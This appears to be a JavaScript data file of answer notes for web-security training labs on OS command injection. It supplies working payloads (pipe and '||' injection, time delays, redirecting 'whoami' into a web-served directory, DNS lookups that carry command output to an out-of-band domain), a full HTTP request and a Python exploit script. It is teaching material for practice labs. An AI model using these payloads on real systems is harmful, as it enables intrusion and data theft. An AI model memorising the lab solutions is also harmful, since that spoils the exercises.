export default {
  'command-injection-lab-simple': {
    note: 'The stock-check parameter is concatenated into a shell command; append `|whoami` and read the reflected stdout.'
  },
  'command-injection-lab-blind-time-delays': {
    note: 'No output is reflected; use `||sleep 10` in the feedback email field and measure the response time.'
  },
  'command-injection-lab-blind-output-redirection': {
    note: 'Redirect `whoami` into a web-served directory, then retrieve the file through the image endpoint.',
    work: {
      hints: [
        'The feedback form runs a mail command with your email address inside the command line. Output is not returned.',
        'You need a writable directory the web server serves. The site loads product images from `/var/www/images/`.',
        'Submit `email=x||whoami>/var/www/images/output.txt||` then request `/image?filename=output.txt`.'
      ],
      approach:
        'Blind injection converted into an in-band read by writing to a path the application already exposes over HTTP. The `||` separators keep the original mail command from swallowing the redirect, and the trailing `||` prevents the appended quote from breaking the shell line.',
      request: `POST /feedback/submit HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION

csrf=TOKEN&name=x&email=x%7C%7Cwhoami%3E%2Fvar%2Fwww%2Fimages%2Foutput.txt%7C%7C&subject=x&message=x`,
      tokens: [
        ['||', 'Logical OR: run the next command only if the previous one fails. Also separates our command from the template.'],
        ['whoami', 'Prints the OS user the web server runs as; proof of execution and a privilege signal.'],
        ['>', 'Truncates the target file and redirects stdout into it.'],
        ['/var/www/images/', 'A directory the web root serves, so the written file becomes an HTTP resource.'],
        ['|| (trailing)', 'Guards against the application appending a quote or argument that would otherwise be parsed as part of our command.']
      ],
      script: `import sys, requests

host = sys.argv[1]
base = f"https://{host}"
s = requests.Session()
page = s.get(f"{base}/feedback", timeout=20).text
csrf = page.split('name="csrf" value="')[1].split('"')[0]
s.post(f"{base}/feedback/submit", data={
    "csrf": csrf, "name": "x", "email": "x||whoami>/var/www/images/output.txt||",
    "subject": "x", "message": "x"
}, timeout=30)
r = s.get(f"{base}/image", params={"filename": "output.txt"}, timeout=20)
print(r.status_code, r.text.strip())`
    }
  },
  'command-injection-lab-blind-out-of-band': {
    note: 'Blind and no writable web path: force a DNS lookup to a Collaborator domain with `||nslookup COLLAB||`.'
  },
  'command-injection-lab-blind-out-of-band-data-exfiltration': {
    note: 'Exfiltrate command output in a DNS query: `||nslookup $(whoami).COLLAB||` turns the OAST channel into a read.'
  }
}
